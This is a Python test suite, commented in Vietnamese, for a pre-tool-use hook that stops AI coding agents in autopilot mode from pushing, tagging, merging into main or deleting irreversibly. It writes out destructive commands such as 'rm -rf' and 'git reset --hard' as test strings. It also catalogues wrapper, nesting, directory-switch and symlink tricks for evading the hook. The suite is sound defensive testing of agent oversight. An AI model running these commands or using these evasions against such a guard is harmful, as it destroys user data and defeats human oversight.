"""Test cho scripts/autopilot_guard.py — rào máy autopilot (hook PreToolUse). Chạy: python -m pytest -q tests/test_autopilot_guard.py"""

from __future__ import annotations

import io
import shutil
import json
import os
import sys

import pytest

import _autopilot_rules
import autopilot_guard
from pathlib import Path

from conftest import REPO, SCRIPTS

ALL = list(_autopilot_rules.AUTOPILOT_EXCLUSIONS)
WITHOUT_BRANCH = [e for e in ALL if e != "branch_merge_local"]


def make_repo(tmp_path, branch="main", marker=None, worktree=False):
    """Dựng repo giả: `.git/HEAD` ở nhánh `branch`; `marker` là dict (ghi JSON), chuỗi (ghi nguyên văn) hay None (không file dấu)."""
    repo = tmp_path / "repo"
    git = repo / ".git"
    git.mkdir(parents=True)
    (git / "HEAD").write_text("ref: refs/heads/{}\n".format(branch), encoding="utf-8")
    (repo / ".tmp").mkdir()
    if marker is not None:
        text = marker if isinstance(marker, str) else json.dumps(marker)
        (repo / ".tmp" / "autopilot.json").write_text(text, encoding="utf-8")
    return repo


def good_marker(exclusions=None):
    return {"level": "gate_1_2", "scope": ["gate_1", "gate_2"], "expires": "sprint_end",
            "exclusions": ALL if exclusions is None else exclusions, "grant_at": "2026-11-20 09:00 +07", "sprints": ["SPR-20"]}


def link_dir(target, link):
    """Symlink thư mục; Windows không đặc quyền thì dùng junction (`mklink /J`). Không được thì bỏ qua test."""
    try:
        os.symlink(target, link, target_is_directory=True)
        return
    except (OSError, NotImplementedError):
        pass
    if os.name == "nt":
        import subprocess
        done = subprocess.run(["cmd", "/c", "mklink", "/J", str(link), str(target)], capture_output=True)
        if done.returncode == 0:
            return
    pytest.skip("không tạo được liên kết thư mục trên máy này")


def claude(cmd, cwd, tool="Bash"):
    return {"tool_name": tool, "tool_input": {"command": cmd}, "cwd": str(cwd)}


def run(fmt, payload, *extra):
    raw = payload if isinstance(payload, str) else json.dumps(payload)
    out, err = io.StringIO(), io.StringIO()
    rc = autopilot_guard.main(["--format", fmt, *extra], stdin=io.StringIO(raw), stdout=out, stderr=err)
    return rc, out.getvalue(), err.getvalue()


def assert_blocked(repo, cmd, item):
    rc, _, err = run("claude", claude(cmd, repo))
    assert rc == 2, (cmd, err)
    assert "'{}'".format(item) in err and "cần người dùng nói trong chat — lệnh không chạy" in err


def assert_allowed(repo, cmd):
    rc, out, err = run("claude", claude(cmd, repo))
    assert (rc, out, err) == (0, "", ""), (cmd, rc, err)


# --- đối chiếu hằng với check.py -------------------------------------------------------------------------------

PINNED_EXCLUSIONS = {"push", "tag", "version", "main_merge", "publish", "license", "irreversible_delete", "rules_unlisted",
                     "user_soul", "secret", "auth", "network_fetch", "branch_merge_local"}


def test_guard_uses_rules_exclusions():
    assert autopilot_guard.known_exclusions() == _autopilot_rules.AUTOPILOT_EXCLUSIONS


def test_guard_exclusions_pinned_to_thirteen():
    """Bớt một mục ở `_autopilot_rules.AUTOPILOT_EXCLUSIONS` sẽ tắt chặn im lặng: ghim danh sách viết tay để test đỏ."""
    assert len(PINNED_EXCLUSIONS) == 13
    assert set(autopilot_guard.known_exclusions()) == PINNED_EXCLUSIONS
    assert set(_autopilot_rules.AUTOPILOT_EXCLUSIONS) == PINNED_EXCLUSIONS and len(_autopilot_rules.AUTOPILOT_EXCLUSIONS) == 13


# --- các test PLAN -----------------------------------------------------------------------------------------------

def test_guard_no_marker_allows(tmp_path):
    repo = make_repo(tmp_path)
    assert_allowed(repo, "git push origin main")
    assert_allowed(repo, "rm -rf build")


def test_guard_blocks_push(tmp_path):
    repo = make_repo(tmp_path, marker=good_marker())
    assert_blocked(repo, "git push", "push")
    assert_blocked(repo, "git push origin spr-12", "push")
    assert_blocked(repo, "git -C ../other push", "push")
    assert_blocked(repo, "git.exe push", "push")
    assert_blocked(repo, "/usr/bin/git -c user.name=x push --force", "push")
    assert_blocked(repo, "GIT_TRACE=1 git push", "push")
    assert_blocked(repo, '"C:\\Program Files\\Git\\bin\\git.exe" push', "push")


def test_guard_blocks_tag(tmp_path):
    repo = make_repo(tmp_path, marker=good_marker())
    assert_blocked(repo, "git tag v1.2.0", "tag")
    assert_blocked(repo, "git tag -a v1.2.0 -m release", "tag")
    assert_blocked(repo, "git tag -f v1", "tag")
    assert_blocked(repo, "git tag -d v1", "irreversible_delete")
    assert_blocked(repo, "git tag --delete v1", "irreversible_delete")
    for readonly in ("git tag", "git tag -l", "git tag --list 'v1*'", "git tag -v v1", "git tag --contains HEAD",
                     "git tag --points-at HEAD", "git tag --merged", "git tag --no-merged", "git tag -n5"):
        assert_allowed(repo, readonly)


def test_guard_blocks_merge_on_main(tmp_path):
    repo = make_repo(tmp_path, branch="main", marker=good_marker(WITHOUT_BRANCH))
    assert_blocked(repo, "git merge spr-12", "main_merge")
    assert_blocked(repo, "git pull", "main_merge")
    assert_blocked(repo, "git pull origin main", "main_merge")
    master = make_repo(tmp_path / "m", branch="master", marker=good_marker(WITHOUT_BRANCH))
    assert_blocked(master, "git merge x", "main_merge")
    # merge --abort không gộp gì
    assert_allowed(repo, "git merge --abort")
    # compound: checkout/switch tới main rồi merge/pull, kể cả khi đang ở nhánh khác
    feature = make_repo(tmp_path / "f", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
    assert_blocked(feature, "git checkout main && git merge spr-12", "main_merge")
    assert_blocked(feature, "git switch master; git pull", "main_merge")
    assert_allowed(feature, "git pull")  # nhánh sprint, không phải nhánh chính
    assert_allowed(feature, "git checkout other && git merge x")  # chỉ branch_merge_local lo, mà marker này cho gộp cục bộ


def test_guard_blocks_gh_pr_merge(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    assert_blocked(repo, "gh pr merge 12 --squash", "main_merge")
    assert_blocked(repo, "gh pr merge", "main_merge")
    assert_allowed(repo, "gh pr view 12")
    assert_allowed(repo, "gh pr list")


@pytest.mark.parametrize("cmd", [
    "rm -rf build", "rm -fr build", "rm -Rf build", "rm -r -f build", "rm --recursive build", "rm -r build",
    "rm -rfv build", "rm -fR build", "rm -r",  # không đích: vẫn chặn
    "git reset --hard", "git reset --hard HEAD~1", "git branch -D old", "git branch -fD old", "git branch --delete --force old",
    "git clean -fd", "git clean -f", "git clean --force -d", "git clean -xdf",
    "git worktree remove -f ../w", "git worktree remove --force ../w",
    "Remove-Item -Recurse -Force build", "Remove-Item build -Recurse", "remove-item -recurse build", "ri -r build",
    "rmdir /s /q build", "rd /S build", "rm -Recurse build", "del /s build",
])
def test_guard_blocks_rm_rf(tmp_path, cmd):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    assert_blocked(repo, cmd, "irreversible_delete")


def test_guard_safe_deletes_allowed(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    for cmd in ("rm file.txt", "rm -f file.txt", "git branch -d merged", "git clean -n", "git reset --soft HEAD~1",
                "git worktree remove ../w", "Remove-Item file.txt -Force", "rmdir empty", "git status", "git log --oneline",
                "git commit -m 'fix git push docs'", "echo git push", "ls -la"):
        assert_allowed(repo, cmd)


def test_guard_blocks_compound_command(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    assert_blocked(repo, "git add -A && git commit -m x && git push", "push")
    assert_blocked(repo, "git status; git push", "push")
    assert_blocked(repo, "git log | cat\ngit push", "push")
    assert_blocked(repo, "false || git push", "push")
    assert_blocked(repo, "(git push)", "push")
    assert_blocked(repo, "echo $(git push)", "push")
    assert_blocked(repo, "sleep 1 & git push", "push")
    assert_blocked(repo, "sudo git push", "push")
    assert_blocked(repo, "bash -c 'git add . && git push'", "push")
    assert_blocked(repo, 'pwsh -NoProfile -Command "git push"', "push")
    assert_blocked(repo, "cmd /c git push", "push")
    # chặn nhầm có chủ ý (mục 5.1): tách thô không hiểu dấu nháy
    assert_blocked(repo, 'git commit -m "a && git push"', "push")


def test_guard_branch_merge_allowed_with_plus_branch(tmp_path):
    feature = make_repo(tmp_path, branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
    assert_allowed(feature, "git merge spr-12-tk3")
    default = make_repo(tmp_path / "d", branch="spr-12", marker=good_marker())
    assert_blocked(default, "git merge spr-12-tk3", "branch_merge_local")
    # khoá exclusions vắng hẳn → mặc định đủ danh sách (gồm branch_merge_local)
    marker = good_marker()
    del marker["exclusions"]
    nokey = make_repo(tmp_path / "n", branch="spr-12", marker=marker)
    assert_blocked(nokey, "git merge x", "branch_merge_local")
    # exclusions không phải danh sách → coi như mặc định
    wrong = make_repo(tmp_path / "w", branch="spr-12", marker=dict(good_marker(), exclusions="push"))
    assert_blocked(wrong, "git merge x", "branch_merge_local")


def test_guard_exclusions_missing_required_filled_in(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker(["version"]))  # thiếu push, tag, ...
    assert_blocked(repo, "git push", "push")
    assert_blocked(repo, "git tag v1", "tag")
    assert_blocked(repo, "rm -rf x", "irreversible_delete")
    # mục lạ bị bỏ qua, không làm hỏng
    odd = make_repo(tmp_path / "o", branch="spr-12", marker=good_marker(WITHOUT_BRANCH + ["bogus", 3]))
    assert_blocked(odd, "git push", "push")
    assert_allowed(odd, "git merge x")


@pytest.mark.parametrize("text", ["{not json", "", "[]", "null", '"x"', "\xef\xbf\xbd"])
def test_guard_bad_marker_fails_closed(tmp_path, text):
    repo = make_repo(tmp_path, branch="spr-12", marker=text)
    rc, _, err = run("claude", claude("git push", repo))
    assert rc == 2 and "file dấu hỏng" in err and "'push'" in err
    rc, _, err = run("claude", claude("git merge x", repo))  # đóng an toàn: cả branch_merge_local
    assert rc == 2 and "'branch_merge_local'" in err
    assert_allowed(repo, "git status")  # lệnh không khớp mẫu vẫn qua


def test_guard_bad_marker_binary_bytes(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    (repo / ".tmp" / "autopilot.json").write_bytes(b"\xff\xfe\x00bad")
    rc, _, err = run("claude", claude("git push", repo))
    assert rc == 2 and "file dấu hỏng" in err


def test_guard_codex_and_antigravity_event_shapes(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    # Codex: tool shell, command dạng chuỗi hoặc danh sách ["bash","-lc","<script>"], cwd ở payload hoặc workdir
    for tool in ("shell", "Bash", "exec_command"):
        rc, out, err = run("codex", {"tool_name": tool, "tool_input": {"command": "git push"}, "cwd": str(repo)})
        assert rc == 2 and out == "" and "'push'" in err
    rc, _, err = run("codex", {"tool_name": "shell", "tool_input": {"command": ["bash", "-lc", "git add . && git push"], "workdir": str(repo)}})
    assert rc == 2 and "'push'" in err
    rc, _, err = run("codex", {"tool_name": "shell", "tool_input": {"command": ["git", "push"]}, "cwd": str(repo)})
    assert rc == 2 and "'push'" in err
    rc, _, err = run("codex", {"tool_name": "shell", "tool_input": {"cmd": "git push"}, "cwd": str(repo)})
    assert rc == 2
    assert run("codex", {"tool_name": "shell", "tool_input": {"command": ["git", "status"]}, "cwd": str(repo)}) == (0, "", "")
    # Codex apply_patch có khoá command nhưng là patch, không phải shell
    patch = "*** Begin Patch\n*** Update File: a.md\n+git push\n*** End Patch"
    assert run("codex", {"tool_name": "apply_patch", "tool_input": {"command": patch}, "cwd": str(repo)}) == (0, "", "")
    # Antigravity: toolCall.args.CommandLine, in JSON quyết định chặn ở stdout, thoát 0; cho qua in {}
    payload = {"toolCall": {"name": "run_command", "args": {"CommandLine": "git push", "Cwd": str(repo)}}, "stepIdx": 1}
    rc, out, err = run("antigravity", payload)
    assert rc == 0 and err == ""
    decision = json.loads(out)
    assert decision["decision"] == "deny" and "'push'" in decision["reason"]
    ok = {"toolCall": {"name": "run_command", "args": {"CommandLine": "git status", "Cwd": str(repo)}}, "stepIdx": 1}
    assert run("antigravity", ok) == (0, "{}\n", "")
    write = {"toolCall": {"name": "write_to_file", "args": {"TargetFile": str(repo / "a.md")}}}
    assert run("antigravity", write) == (0, "{}\n", "")
    # PowerShell của Claude trên Windows
    rc, _, err = run("claude", claude("git push", repo, tool="PowerShell"))
    assert rc == 2
    # công cụ không phải shell: cho qua dù chứa chữ git push
    assert run("claude", {"tool_name": "Write", "tool_input": {"file_path": "x", "content": "git push", "command": "git push"}, "cwd": str(repo)}) == (0, "", "")
    assert run("claude", {"tool_name": "mcp__x__y", "tool_input": {"command": "git push"}, "cwd": str(repo)}) == (0, "", "")
    # không có tên công cụ nhưng có lệnh: coi là shell (đóng)
    assert run("claude", {"tool_input": {"command": "git push"}, "cwd": str(repo)})[0] == 2
    # shell mà không có lệnh
    assert run("claude", {"tool_name": "Bash", "tool_input": {}, "cwd": str(repo)}) == (0, "", "")


# --- tìm file dấu và nhánh ----------------------------------------------------------------------------------------

def test_guard_finds_marker_walking_up(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    sub = repo / "src" / "deep"
    sub.mkdir(parents=True)
    assert_blocked(sub, "git push", "push")


def test_guard_stops_at_first_git(tmp_path):
    outer = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    inner = outer / "vendor"
    (inner / ".git").mkdir(parents=True)  # repo lồng: file dấu ở ngoài không áp
    assert_allowed(inner, "git push")


def test_guard_worktree_gitdir_file(tmp_path):
    repo = make_repo(tmp_path, branch="main", marker=good_marker(WITHOUT_BRANCH))
    gitdir = repo / ".git" / "worktrees" / "wt"
    gitdir.mkdir(parents=True)
    (gitdir / "HEAD").write_text("ref: refs/heads/spr-12\n", encoding="utf-8")
    wt = tmp_path / "wt"
    (wt / ".tmp").mkdir(parents=True)
    (wt / ".git").write_text("gitdir: {}\n".format(gitdir), encoding="utf-8")
    (wt / ".tmp" / "autopilot.json").write_text(json.dumps(good_marker(WITHOUT_BRANCH)), encoding="utf-8")
    assert_allowed(wt, "git merge x")  # nhánh sprint trong worktree, không phải main
    assert_allowed(wt, "git pull")
    (gitdir / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
    assert_blocked(wt, "git merge x", "main_merge")
    # worktree không thấy file dấu của repo chính
    other = tmp_path / "wt2"
    other.mkdir()
    (other / ".git").write_text("gitdir: {}\n".format(gitdir), encoding="utf-8")
    assert_allowed(other, "git push")
    # gitdir tương đối
    rel = tmp_path / "wt3"
    (rel / ".tmp").mkdir(parents=True)
    (rel / ".git").write_text("gitdir: ../repo/.git/worktrees/wt\n", encoding="utf-8")
    (rel / ".tmp" / "autopilot.json").write_text(json.dumps(good_marker(WITHOUT_BRANCH)), encoding="utf-8")
    assert_blocked(rel, "git merge x", "main_merge")


@pytest.mark.parametrize("head", ["abc123def\n", "", "ref: refs/heads/\n"])
def test_guard_unknown_branch_treated_as_main(tmp_path, head):
    repo = make_repo(tmp_path, marker=good_marker(WITHOUT_BRANCH))
    (repo / ".git" / "HEAD").write_text(head, encoding="utf-8")
    assert_blocked(repo, "git merge x", "main_merge")


def test_guard_missing_head_treated_as_main(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
    (repo / ".git" / "HEAD").unlink()
    assert_blocked(repo, "git merge x", "main_merge")


def test_guard_no_cwd_uses_process_cwd(tmp_path, monkeypatch):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    monkeypatch.chdir(repo)
    rc, _, err = run("claude", {"tool_name": "Bash", "tool_input": {"command": "git push"}})
    assert rc == 2 and "'push'" in err
    monkeypatch.chdir(tmp_path)
    assert run("claude", {"tool_name": "Bash", "tool_input": {"command": "git push"}}) == (0, "", "")


def test_guard_marker_without_git_repo(tmp_path):
    (tmp_path / "plain" / ".tmp").mkdir(parents=True)
    (tmp_path / "plain" / ".tmp" / "autopilot.json").write_text(json.dumps(good_marker(WITHOUT_BRANCH)), encoding="utf-8")
    assert_blocked(tmp_path / "plain", "git push", "push")
    assert_blocked(tmp_path / "plain", "git merge x", "main_merge")  # không rõ nhánh: coi như main
    assert_blocked(tmp_path / "plain", "rm -rf .tmp/x", "irreversible_delete")  # không có gốc repo: không có ngoại lệ .tmp


# --- ngoại lệ dọn .tmp/ (N1) --------------------------------------------------------------------------------------

def test_guard_tmp_cleanup_exception(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    (repo / ".tmp" / "scratch").mkdir()
    for cmd in ("rm -rf .tmp/scratch", "rm -fr .tmp/scratch", "rm -r -f .tmp/scratch", "rm --recursive .tmp/scratch",
                "rm -rf ./.tmp/scratch", "rm -rf .tmp/scratch/", "rm -rf .tmp\\scratch", "Remove-Item -Recurse -Force .tmp\\scratch",
                "rm -rf .tmp/a .tmp/b", "rm -rf '.tmp/with space'", "rm -rf .tmp/out*", "rm -rf .tmp/scratch/*", "rm -rf .tmp/ab[c]",
                "rm -rf " + str(repo / ".tmp" / "scratch"), "rmdir /s /q .tmp\\scratch"):
        assert_allowed(repo, cmd)


@pytest.mark.parametrize("cmd", [
    "rm -rf .tmp", "rm -rf .tmp/", "rm -rf .tmp/.", "rm -rf .tmp/*", "rm -rf .tmp/a*", "rm -rf .tmp/autopilot.json",
    "rm -rf .tmp/AUTOPILOT.JSON", "rm -rf .tmp/../src", "rm -rf .tmp/x/../../src", "rm -rf .tmp/scratch ..", "rm -rf .tmp/scratch build",
    "rm -rf src/.tmp/x", "rm -rf /tmp/x", "rm -rf .tmp/$X", "rm -rf .tmp/x,../y", "rm -rf ~/.tmp/x", "rm -rf .tmp/{a,b}",
    "rm -rf .tmp/*/x/../..", "rm -rf .tm*/x", "cd src && rm -rf .tmp/scratch",
    "rm -rf .tmpx/a", "rm -rf", "Remove-Item -Recurse .tmp",
])
def test_guard_tmp_exception_not_applied(tmp_path, cmd):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    (repo / "src").mkdir()
    assert_blocked(repo, cmd, "irreversible_delete")


def test_guard_tmp_exception_from_subdir_uses_repo_root(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    sub = repo / "src"
    sub.mkdir()
    # từ thư mục con, `.tmp/x` là .tmp của thư mục con, không phải của gốc repo → chặn; đường tuyệt đối vào .tmp gốc → qua
    assert_blocked(sub, "rm -rf .tmp/x", "irreversible_delete")
    assert_blocked(sub, "rm -rf ../.tmp/x", "irreversible_delete")  # có ".."
    assert_allowed(sub, "rm -rf " + str(repo / ".tmp" / "x"))


def test_guard_tmp_exception_symlink_escapes(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    outside = tmp_path / "outside"
    outside.mkdir()
    link_dir(outside, repo / ".tmp" / "link")
    assert_blocked(repo, "rm -rf .tmp/link", "irreversible_delete")
    assert_blocked(repo, "rm -rf .tmp/link/inside", "irreversible_delete")
    assert_allowed(repo, "rm -rf .tmp/real")  # tên thường không tồn tại: vẫn nằm trong .tmp


def test_guard_tmp_dir_itself_a_link(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=None)
    outside = tmp_path / "outside"
    outside.mkdir()
    marker_text = json.dumps(good_marker())
    (outside / "autopilot.json").write_text(marker_text, encoding="utf-8")
    (repo / ".tmp").rmdir()
    link_dir(outside, repo / ".tmp")
    assert_blocked(repo, "rm -rf .tmp/x", "irreversible_delete")  # .tmp là link ra ngoài: không có ngoại lệ


def test_guard_tmp_marker_symlinked_target(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    try:
        os.symlink(repo / ".tmp" / "autopilot.json", repo / ".tmp" / "alias")
    except (OSError, NotImplementedError):
        pytest.skip("không tạo được symlink trên máy này")
    assert_blocked(repo, "rm -rf .tmp/alias", "irreversible_delete")  # trỏ tới file dấu


# --- lỗi đầu vào ------------------------------------------------------------------------------------------------

def test_guard_bad_stdin_without_marker_passes_and_with_marker_blocks(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    assert run("claude", "{broken") == (0, "", "")
    assert run("antigravity", "[]") == (0, "{}\n", "")
    repo = make_repo(tmp_path / "r", branch="spr-12", marker=good_marker())
    monkeypatch.chdir(repo)
    rc, _, err = run("claude", "{broken")
    assert rc == 2 and "autopilot" in err
    rc, out, _ = run("antigravity", "null")
    assert rc == 0 and json.loads(out)["decision"] == "deny"


def test_guard_unexpected_exception_closed_with_marker(tmp_path, monkeypatch):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    monkeypatch.chdir(repo)  # ngoại lệ lạ → dò file dấu từ thư mục của tiến trình hook
    monkeypatch.setattr(autopilot_guard, "_analyze", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")))
    rc, _, err = run("claude", claude("git status", repo))
    assert rc == 2 and "RuntimeError" in err
    monkeypatch.setenv("AUTOPILOT_GUARD_DEBUG", "1")
    rc, _, err = run("claude", claude("git status", repo))
    assert rc == 2 and "Traceback" in err
    # không có file dấu: lỗi lạ không chặn việc của người dùng
    plain = tmp_path / "plain"
    plain.mkdir()
    monkeypatch.chdir(plain)
    assert run("claude", claude("git status", plain))[0] == 0


def _nest(cmd, layers):
    for _ in range(layers):
        cmd = 'bash -c "{}"'.format(cmd.replace('"', "'"))
    return cmd


def test_guard_deep_command_nesting_fails_closed(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    rc, _, err = run("claude", claude(_nest("git push", 3), repo))  # trong giới hạn: mở hết lớp, thấy push
    assert rc == 2 and "'push'" in err
    rc, _, err = run("claude", claude(_nest("git push", 4), repo))  # quá giới hạn: không phân tích được → chặn
    assert rc == 2 and "lồng" in err and "hook gặp lỗi" not in err
    rc, _, err = run("claude", claude(_nest("git status", 6), repo))
    assert rc == 2 and "lồng" in err
    plain = tmp_path / "plain"
    plain.mkdir()
    assert run("claude", claude(_nest("git push", 6), plain)) == (0, "", "")  # không có file dấu → qua


def test_guard_cli_subprocess(tmp_path):
    import subprocess
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    payload = json.dumps(claude("git push", repo))
    proc = subprocess.run([sys.executable, str(SCRIPTS / "autopilot_guard.py"), "--format", "claude"], input=payload,
                          capture_output=True, text=True, encoding="utf-8", cwd=str(repo))
    assert proc.returncode == 2 and "'push'" in proc.stderr and proc.stdout == ""
    ok = subprocess.run([sys.executable, str(SCRIPTS / "autopilot_guard.py"), "--format", "antigravity"], input="{broken",
                        capture_output=True, text=True, encoding="utf-8", cwd=str(tmp_path))
    assert ok.returncode == 0 and ok.stdout.strip() == "{}"


# ===================== vòng sửa 1 (S-RF1…S-RF9, T-RF1…T-RF4) =====================

def codex(cmd, cwd=None, workdir=None):
    payload = {"tool_name": "shell", "tool_input": {"command": cmd}}
    if cwd is not None:
        payload["cwd"] = str(cwd)
    if workdir is not None:
        payload["tool_input"]["workdir"] = str(workdir)
    return payload


def fwd(path):
    return str(path).replace("\\", "/")


def test_guard_workdir_beats_session_cwd(tmp_path):
    """S-RF1 / T-RF3: thư mục của lệnh (workdir) quyết định, không phải cwd của phiên."""
    repo = make_repo(tmp_path / "a", branch="spr-12", marker=good_marker())
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    rc, _, err = run("codex", codex(["bash", "-lc", "git push"], cwd=elsewhere, workdir=repo))
    assert rc == 2 and "'push'" in err
    # cwd phiên trong repo có file dấu, workdir nơi không có: file dấu của phiên vẫn áp (thấy ở đâu cũng bật)
    rc, _, err = run("codex", codex(["bash", "-lc", "git push"], cwd=repo, workdir=elsewhere))
    assert rc == 2
    # nhánh đọc ở workdir: phiên ở worktree sprint, lệnh chạy ở bản checkout main
    mainrepo = make_repo(tmp_path / "m", branch="main", marker=good_marker(WITHOUT_BRANCH))
    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
    rc, _, err = run("codex", codex("git merge spr-12", cwd=sprint, workdir=mainrepo))
    assert rc == 2 and "'main_merge'" in err
    assert run("codex", codex("git merge x", cwd=mainrepo, workdir=sprint)) == (0, "", "")
    # workdir tương đối ghép với cwd phiên; Antigravity: Cwd trong args thắng cwd phiên
    (repo / "sub").mkdir()
    rc, _, err = run("codex", {"tool_name": "shell", "cwd": str(repo), "tool_input": {"command": "git push", "workdir": "sub"}})
    assert rc == 2
    ag = {"toolCall": {"name": "run_command", "args": {"CommandLine": "git push", "Cwd": str(repo)}}, "cwd": str(elsewhere)}
    assert json.loads(run("antigravity", ag)[1])["decision"] == "deny"


def test_guard_error_after_event_dir_probes_event_dir(tmp_path, monkeypatch):
    """T-RF1 / S-RF4: lỗi sau khi có thư mục sự kiện → dò file dấu ở thư mục sự kiện, không phải thư mục tiến trình."""
    repo = make_repo(tmp_path / "r", branch="spr-12", marker=good_marker())
    away = tmp_path / "away"
    away.mkdir()
    monkeypatch.chdir(away)

    def boom():
        raise ImportError("check không nhập được")

    monkeypatch.setattr(autopilot_guard, "known_exclusions", boom)
    rc, _, err = run("claude", claude("git push", repo))
    assert rc == 2 and "ImportError" in err
    rc, out, _ = run("antigravity", {"toolCall": {"name": "run_command", "args": {"CommandLine": "git push", "Cwd": str(repo)}}})
    assert rc == 0 and json.loads(out)["decision"] == "deny"
    assert run("claude", claude("git push", away)) == (0, "", "")  # thư mục sự kiện không file dấu: lỗi không chặn
    monkeypatch.undo()
    monkeypatch.chdir(away)
    monkeypatch.setattr(autopilot_guard, "_analyze", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")))
    rc, _, err = run("claude", claude("git status", repo))
    assert rc == 2 and "RuntimeError" in err


@pytest.mark.parametrize("cmd", [
    "timeout 60 git push", "timeout -s KILL 30 git push", "timeout --signal=KILL 5 git push", "timeout -k 5 60 git push",
    "env -i git push", "env -u HOME git push", "env FOO=bar BAZ=1 git push", "env -i FOO=1 git push", "env -S 'git push'",
    "sudo -u deploy git push", "sudo -E git push", "sudo -u x -g y git push", "sudo --user=x git push",
    "nice -n 10 git push", "nice -10 git push", "command -p git push", "nohup git push", "time git push", "time -p git push",
    "ls | xargs -0 git push", "xargs -n 1 -I {} git push", "echo x | xargs -r git push",
    "stdbuf -oL git push", "exec git push", "/usr/bin/env git push", "sudo env FOO=1 timeout 5 git push",
])
def test_guard_prefix_wrappers_with_their_arguments(tmp_path, cmd):
    """S-RF2 / T-RF6: tiền tố kèm cờ và đối số vẫn lộ lệnh thật."""
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    assert_blocked(repo, cmd, "push")


def test_guard_prefix_wrappers_other_items(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    assert_blocked(repo, "timeout 60 rm -rf build", "irreversible_delete")
    assert_blocked(repo, "ls | xargs -0 rm -rf", "irreversible_delete")
    assert_blocked(repo, "sudo -u x gh pr merge 3", "main_merge")
    assert_allowed(repo, "timeout 60 git status")
    assert_allowed(repo, "env -i FOO=1 ls")
    assert_allowed(repo, "sudo -u x ls")


@pytest.mark.parametrize("cmd", [
    "cd {main} && git merge spr-12", "cd {main}; git pull", "pushd {main} && git merge x", "Set-Location {main}; git merge x",
    "git -C {main} merge spr-12", "git -C {main} pull", "git -C {main} -c user.name=x merge y",
    "cd {rel} && git merge x", "cd $UNKNOWN && git merge x", "git -C $UNKNOWN merge x", "cd && git merge x", "cd - && git merge x",
    "GIT_DIR={main}/.git git merge x", "git --git-dir={main}/.git merge x", "git --work-tree {main} merge x",
])
def test_guard_merge_reads_branch_of_target_dir(tmp_path, cmd):
    """T-RF2: lệnh chạy ở worktree sprint nhưng cd/-C sang bản checkout main, hay không xác định được thư mục → coi là main."""
    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
    mainrepo = make_repo(tmp_path / "m", branch="main")
    rel = fwd(os.path.relpath(mainrepo, sprint))
    assert_blocked(sprint, cmd.format(main=fwd(mainrepo), rel=rel), "main_merge")


def test_guard_merge_in_non_main_dir_allowed(tmp_path):
    sprint = make_repo(tmp_path / "s", branch="spr-12", marker=good_marker(WITHOUT_BRANCH))
    other = make_repo(tmp_path / "o", branch="spr-13")
    rel = fwd(os.path.relpath(other, sprint))
    for cmd in ("git -C {o} merge x", "git -C {o} pull"):
        assert_allowed(sprint, cmd.format(o=fwd(other), r=rel))
    for cmd in ("cd {o} && git merge x", "cd {r} && git pull"):  # đổi thư mục rồi gộp: chặn nhầm có chủ đích
        assert_blocked(sprint, cmd.format(o=fwd(other), r=rel), "main_merge")
    mainrepo = make_repo(tmp_path / "m", branch="main", marker=good_marker(WITHOUT_BRANCH))
    assert_allowed(mainrepo, "git -C {} merge x".format(fwd(other)))  # từ thư mục main, -C sang nhánh sprint → đọc nhánh sprint


@pytest.mark.parametrize("cmd", ["gh -R o/r pr merge 12", "gh --repo o/r pr merge 12", "gh pr -R o/r merge 12",
                                 "gh pr --repo=o/r merge 12", "gh pr merge 12 -R o/r", "gh -Ro/r pr merge 1", "gh pr merge"])
def test_guard_gh_repo_flag_any_position(tmp_path, cmd):
    """S-RF5 / T-RF5."""
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    assert_blocked(repo, cmd, "main_merge")


def test_guard_gh_repo_flag_not_merge(tmp_path):
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    for cmd in ("gh -R o/r pr view 12", "gh pr -R o/r list", "gh -R merge pr view"):
        assert_allowed(repo, cmd)


def test_guard_more_patterns(tmp_path):
    """S-RF6: git subtree push, gh release create, find -exec/-delete."""
    repo = make_repo(tmp_path, branch="spr-12", marker=good_marker())
    assert_blocked(repo, "git subtree push --prefix=x origin main", "push")
    assert_blocked(repo, "gh release create v1.0 --notes x", "tag")
    assert_blocked(repo, "gh -R o/r release create v1", "tag")
    assert_blocked(repo, "find . -name '*.o' -delete", "irreversible_delete")
    assert_blocked(repo, "find build -exec rm -rf {} +", "irreversible_delete")
    assert_blocked(repo, "find build -type d -execdir rm -r {} +", "irreversible_delete")
    assert_allowed(repo, "git subtree split --prefix=x")
    assert_allowed(repo, "gh release list")
    assert_allowed(repo, "gh release view v1")
